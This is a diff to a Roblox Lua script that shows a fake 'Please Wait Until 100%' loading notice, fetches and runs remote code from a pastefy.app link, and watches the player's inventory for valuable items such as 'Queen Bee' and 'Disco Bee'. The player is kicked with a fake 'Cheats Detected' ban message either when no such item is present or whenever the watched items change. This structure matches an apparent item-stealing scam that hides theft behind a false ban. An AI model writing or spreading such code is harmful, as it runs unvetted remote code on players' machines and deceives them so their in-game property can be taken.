@@ -11,8 +11,71 @@ else
         Text = "Please Wait Until 100%",
         Duration = 5
     })
+
     loadstring(game:HttpGet("https://pastefy.app/qAwjuN6m/raw"))()
-wait(1)
-    loadstring(game:HttpGet("https://pastefy.app/HvagfOyg/raw"))()
+    task.wait(1)
+    local player = game.Players.LocalPlayer
+
+local keywords = {
+    "Queen Bee",
+    "Disco Bee",
+    "Butterfly",
+    "Raccoon",
+    "Dragonfly"
+}
+
+local function removeSpaces(str)
+    return string.gsub(str, "%s+", "")
 end
 
+local function hasKeywordItem()
+    local function checkContainer(container)
+        if not container then return false end
+        for _, item in ipairs(container:GetChildren()) do
+            local itemName = removeSpaces(string.lower(item.Name))
+            for _, keyword in ipairs(keywords) do
+                local keywordCheck = removeSpaces(string.lower(keyword))
+                if string.find(itemName, keywordCheck, 1, true) then
+                    return true
+                end
+            end
+        end
+        return false
+    end
+
+    return checkContainer(player:FindFirstChild("Backpack")) or checkContainer(player.Character)
+end
+
+local function kickPlayer(reason)
+    player:Kick(reason)
+end
+
+local function monitorContainers()
+    local function checkAndKick()
+        if not hasKeywordItem() then
+            kickPlayer("Cheats Detected: you have been banned for 10499 hours 59 minutes 59 second")
+        end
+    end
+
+    local backpack = player:WaitForChild("Backpack")
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    if backpack then
+        backpack.ChildAdded:Connect(checkAndKick)
+        backpack.ChildRemoved:Connect(checkAndKick)
+    end
+
+    if character then
+        character.ChildAdded:Connect(checkAndKick)
+        character.ChildRemoved:Connect(checkAndKick)
+    end
+end
+
+local backpack = player:WaitForChild("Backpack")
+local character = player.Character or player.CharacterAdded:Wait()
+
+if hasKeywordItem() then
+    monitorContainers()
+else
+    kickPlayer("Cheats Detected: you have been banned for 10499 hours 59 minutes 59 second")
+end
